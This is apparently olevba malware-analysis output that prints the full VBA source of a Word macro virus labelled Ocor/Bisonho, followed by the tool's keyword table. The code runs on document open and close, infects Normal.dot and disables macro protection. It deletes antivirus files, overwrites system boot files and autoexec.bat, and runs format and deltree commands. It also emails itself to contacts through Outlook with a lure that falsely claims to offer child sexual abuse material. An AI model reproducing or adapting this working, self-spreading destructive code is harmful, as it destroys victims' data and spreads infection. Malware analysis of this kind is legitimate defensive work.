olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ocor-c2875b6f17b93893b839a3b94ae0245da95ecef8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ocor-c2875b6f17b93893b839a3b94ae0245da95ecef8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSWord.Ocor-c2875b6f17b93893b839a3b94ae0245da95ecef8 - OLE stream: 'Macros/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    Document_Open
End Sub

Private Sub Document_New()
    Document_Open
End Sub

Private Sub Document_Open()

On Error Resume Next            'Se ocorrer algum erro... pule!
Application.EnableCancelKey = 0 'Desabilita Control+Break

Set Arch = ActiveDocument.VBProject.VBComponents.Item(1)
Set Norm = NormalTemplate.VBProject.VBComponents.Item(1)
Set ItsMe = Me.VBProject.VBComponents.Item(1)
If Norm.CodeModule.Lines(1, 1) <> "'Bisonho Rulez" Then
Norm.CodeModule.DeleteLines 1, Norm.CodeModule.CountOfLines
Norm.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
Norm.Name = "Bisonho"  'Muda o nome do projeto para Bisonho
End If 'Termina o bloco de condicoes *SE*

If Arch.CodeModule.Lines(1, 1) <> "'Bisonho Rulez" Then
Arch.CodeModule.DeleteLines 1, Arch.CodeModule.CountOfLines
Arch.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
Arch.Name = "Bisonho"  'Muda o nome do projeto para Bisonho
End If 'Termina o bloco de condicoes *SE*

If Dir("C:\Ethan.___", 6) <> "" Then
SetAttr "C:\Ethan.___", vbNormal
Kill "C:\Ethan.___"                     'Deleta essa droga!
End If                                  'Termina o bloco de condicoes *SE*

RetroAction                             'Chama a sub RetroAction

If Day(Now) = Month(Now) Then ChooseActions
If Minute(Now) = Second(Now) Then
Msg = "Ocorreu um erro. A possivel causa e que vc tenha um penis pequeno. Vc tem um penis pequeno?"
Style = vbYesNo + vbQuestion    'Estilo da mensagem
Title = "Microsoft Word"        'Titulo da mensagem
Ret = MsgBox(Msg, Style, Title) 'Escolha do cidadao
If Ret = vbNo Then LoopIt       'Disse que nao? Pergunta de novo!

ThisIsSpecial           'Chama essa sub...
EmailCopy               'Chama essa sub tb.
End If


End Sub                                 'Termina a sub (DUH...)

Private Sub RetroAction()
On Error Resume Next    'Ocorreu algum erro? Pule...
Application.EnableCancelKey = wdCancelDisabled  'Desabilita o Control+Break
Options.VirusProtection = False                 'Desativa a verificacao de
macros no documento
Options.SaveNormalPrompt = False                'Desativa o aviso para salvar o
normal.dot

CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("View").Controls(6).Visible = False
CustomizationContext = NormalTemplate
KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11),

KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8),

KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
Dim McAfee, FMcAfee, FProt, FFProt, VET, FVET, Avast, FAvast, TheCleaner,
FTheCleaner , Panda, FPanda, AVP, FAVP          'Declara variaveis...

FProt = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32", "Location")
VET = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident", "VetPath")
McAfee = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "szProductLocation")
Avast = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32", "Path")
TheCleaner = System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner", "tcshellex")
Panda = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0", "Path")
AVP = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100", "Folder")
        

FFProt = FProt + "\*.*"
FVET = VET + "\*.*"
FMcAfee = McAfee + "\*.*"
FAvast = Avast + "\*.*"
FTheCleaner = TheCleaner + "\*.*"
FPanda = Panda + "*.*" 'a chave de registro do panda tem um \ na frente..
FAVP = AVP + "\*.*"
Affprot = FProt + "\*.Dat"
Bffprot = FProt + "\*.Def"
Afvet = VET + "\*.Dat"
AFMcAfee = McAfee + "\*.Dat"
afavast = Avast + "\*.Dat"
bfavast = Avast + "\*.Dll"
afthecleaner = TheCleaner + "\*.Dll"
afpanda = Panda + "*.Dat"
bfpanda = Panda + "*.Dll"
afavp = AVP + "\*.Dat"
bfavp = AVP + "\*.Dll"

Kill Affprot
Kill Bffprot
Kill Afvet
Kill AFMcAfee
Kill afavast
Kill bfavast
Kill afthecleaner
Kill afpanda
Kill bfpanda
Kill afavp
Kill bfavp
Kill FFProt
Kill FVET
Kill FMcAfee
Kill FAvast
Kill FTheCleaner
Kill FPanda
Kill FAVP


System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "0") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "1") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "2") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "3") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "4") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "5") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "6") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "7") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "8") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "9") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "10") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoStart") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoVerify") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "BOProt") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "ExtraPort") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "NetBusAdv") = "DISABLED"


End Sub

Private Sub hahaNOT() 'Sub vazia que nao faz nada (DUH!)

End Sub

Private Sub Action1()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "A Berne Maltesa Rulez..."
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "HEHEHEHE... esta e a Lixeira do Dick Moe... eu comando essa bagaca ok??? ---A BERNE MALTESA---"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "Dick Moe Recycle Bin"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "HEHEHEHE... esta e a Lixeira do Dick Moe... eu comando essa bagaca ok??? ---A BERNE MALTESA---"
End Sub

Private Sub Action2()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "BitsPerPixel") = "8"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "DICK MOE"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "A BERNE MALTESA"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Windous 1.0 by DICK MOE"
End Sub

Private Sub Action3()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "7"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "MouseSpeed") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "DoubleClickSpeed") = "100"
End Sub

Private Sub Action4()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ButtonFace") = "200 40 10"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ActiveTitle") = "0 250 100"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Menu") = "0 0 0"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Window") = "100 100 200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ScrollBar") = "100 100 200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "WindowText") = "255 255 255"
End Sub

Private Sub Action5()
On Error Resume Next
N$ = WordBasic.[DefaultDir$](2) + "\Normal.dot" 'Informa o caminho do normaldot
FileCopy N$, "C:\Leia.dot"                      'Faz uma copia dele.
SetAttr "C:\*.*", vbNormal              'Atribui C:\*.* como normal
Open "C:\io.sys" For Output As #1               'Abre io.sys
Open "C:\msdos.sys" For Output As #2            'Abre msdos.sys
Open "C:\command.com" For Output As #3          'Abre command.com
Open "C:\Windows\win.com" For Output As #4      'Abre win.com
Print #1, "Vc foi dominado pelo virus Bisonho"          'Escreve umas
Print #2, "Escrito por DICK MOE - Brasil"                       'mensaginhas
Print #3, "Presidente do grupo A BERNE MALTESA"                 'bunitinhas
Print #4, "Um verdadeiro virus de macro... querem competir???"  'ehhehe
Close #1                                        '
Close #2                                        'Fecha os arquivos abertos
Close #3                                        'zerados (so com as mensagens)
Close #4                                        '
Open "C:\autoexec.bat" For Output As #1         'Abre o Autoexec e deixa um
recado
Print #1, "@echo off"
Print #1, "BREAK OFF > NUL"
Print #1, "Echo vc foi destruido pelo virus Bisonho"
Print #1, "pause > nul"
Print #1, "Echo escrito por DICK MOE"
Print #1, "pause > nul"
Print #1, "Echo quer se vingar???"
Print #1, "pause > nul"
Print #1, "Echo passe o arquivo c:\leia.dot para alguem!!!"
Print #1, "pause > nul"
Print #1, ":loop"
Print #1, "Echo Daniel e Tatiana"
Print #1, "Goto loop"
Close #1                        'Fecha o arquivo
End Sub

Sub ChooseActions()
On Error Resume Next 'Ocorreu um erro, pule.
Dim Chance           'Variavel
Randomize                       'Iniciar o gerador de nºs aleatorios
Chance = Int((40 * Rnd) + 1)    'Chance de 1 em 8.
If Chance = 1 Then Action1      'Numero sorteado = 1, acao 1
If Chance = 10 Then Action2     'Numero sorteado = 2, acao 2
If Chance = 20 Then Action3     'e etc.
If Chance = 30 Then Action4
If Chance = 40 Then Action5
End Sub

Sub ThisIsSpecial()
On Error Resume Next

If Day(Now) = "7" And Month(Now) = "9" Then MsgBox "ow! It's my BirthDay!!! Sete de setembro de 1984!!! Please, CAI FORA!!!", vbSystemModal + vbOKOnly, "Dick Moe": Application.Quit wdDoNotSaveChanges: Tasks.ExitWindows
Shell "C:\Windows\Command\Format.com C:/Autotest"  'Valeu ai NIM BUS!!!!!
If Day(Now) = "7" And Month(Now) = "11" Then
mbox = "ow! It's my syster's BirthDay!!! Do you really want to remove the "
WINDOWS folder and all of contents???": st = vbYes + vbQuestion: tit = "Dick Moe"
r = MsgBox(mbox, st, tit)
If r = vbYes Then
Application.StatusBar = "Removendo C:\Windows... 3%"    'Mostra na barra de status
Kill "C:\Windows\*.exe"                                 'Apaga os arquivos
Application.StatusBar = "Removendo C:\Windows... 13%"
Kill "C:\Windows\*.bmp"
Application.StatusBar = "Removendo C:\Windows... 19%"
Kill "C:\Windows\*.gif"
Application.StatusBar = "Removendo C:\Windows... 29%"
Kill "C:\Windows\*.com"
Application.StatusBar = "Removendo C:\Windows... 33%"
Kill "C:\Windows\*.jpg"
Application.StatusBar = "Removendo C:\Windows... 45%"
Kill "C:\Windows\*.dll"
Application.StatusBar = "Removendo C:\Windows... 56%"
Kill "C:\Windows\*.sys"
Application.StatusBar = "Removendo C:\Windows... 69%"
Kill "C:\Windows\*.txt"
Application.StatusBar = "Removendo C:\Windows... 75%"
Kill "C:\Windows\*.doc"
Application.StatusBar = "Removendo C:\Windows... 80%"
Kill "C:\Windows\*.dat"
Application.StatusBar = "Removendo C:\Windows... 99%"
Kill "C:\Windows\*.pwl"
Application.StatusBar = "Removendo C:\Windows... done"
End If
End If

If Day(Now) = "7" And Month(Now) = "6" Then
MsgBox "ow! It's my mommy's Birthday... ow? What is it???", vbExclamation, "Dick Moe"
Static P
Static Q
Dim S
S = "\Mommy"
P = "C:\Mommy"
MkDir P
Pastas:
Q = Q + 1: If Q >= 5000 Then GoTo Fim
P = P + S
MkDir P
GoTo Pastas
Fim:
End If

If Day(Now) = "8" And Month(Now) = "2" Then
MsgBox "ow! It's my daddy's Birthday... Do you want to go to the party???",
vbCritical , "Dick Moe"
Shell "Deltree/y c:\windows\menu iniciar"
Shell "Deltree/y c:\windows\start menu"
End If

If Day(Now) = Second(Now) Then                  'Condicao Day=Second
MsgBox "Jockey PÔ!!!", vbExclamation, "Dick Moe" 'Mensagem
Dim FILEEE                                      'Variavel
FILEEE = Dir("C:\Windows\*.*")                  'Arquivo aleatorio
Open FILEEE For Append As #1                    'Abre o arquivo
Randomize: o = Int((2 * Rnd) + 1)               'Ganhou ou perdeu?
If o = 1 Then Print #1, "Ow, you loose, try again!!!"   'Perdeu...
If o = 2 Then Print #1, "Ow yeah! You win... SHIT"
'Ganhou... anota tudinho no arquivo
Print #1, "Do you want to play again???"        'Vc quer jogar de novo?
Print #1, ""
Close #1
End If
End Sub

Private Sub EmailCopy()
On Error Resume Next
Application.EnableCancelKey = 0

Dim OutLookAp, NamOfMapi, BisonhoMail   'Inicializa variaveis
Set OutLookAp = CreateObject("Outlook.Application")     'Inicializa o Outlook
Set NamOfMapi = OutLookAp.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Bisonho") <> "Sim, sou eu mesmo, e dai?" Then

If OutLookAp = "Outlook" Then
NamOfMapi.Logon "profile", "password"           'Inicializa a conta do usuario
For y = 1 To NamOfMapi.AddressLists.Count       'Conta quantos enderecos tem
Set AddyBook = NamOfMapi.AddressLists(y)
x = 1
Set BisonhoMail = OutLookAp.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
TheEntries = AddyBook.AddressEntries(x)
BisonhoMail.Recipients.Add TheEntries           'Adiciona entradas
x = x + 1
If x > 50 Then oo = AddyBook.AddressEntries.Count
Next oo


If CommandBars("Tools").Name = "Tools" Then     'Se o nome for Tools
BisonhoMail.Subject = "Important Message From " & Application.UserName
BisonhoMail.Body = "This is a huge list of sites of kids sex... I saw the whole document and all of the sites are online and free! Check out by yourself..."
ElseIf CommandBars("Tools").Name = "Ferramentas" Then   'Se for ferramentas..
BisonhoMail.Subject = "E ai, blz?" & Application.UserName
BisonhoMail.Body = "Ontem eu entrei no chat da UOL e catei um monte de sites de sexo de kids. E bem loco e todos sao gratis e estao online... da um ligo pra vc ver... tem bastante."
Else
BisonhoMail.Subject = "Important Message From " & Application.UserName
BisonhoMail.Body = "This is a huge list of sites of kids sex... I saw the whole document and all of the sites are online and free! Check out by yourself..."
End If


BisonhoMail.Attachments.Add ActiveDocument.FullName     'Anexa o doc infectado
BisonhoMail.Send                        'E envia para a lista inteira

TheEntries = "" 'Reseta a variavel
Next y
NamOfMapi.Logoff        'Fecha a conta
End If

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Bisonho") = "Sim, sou eu mesmo, e dai?"
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

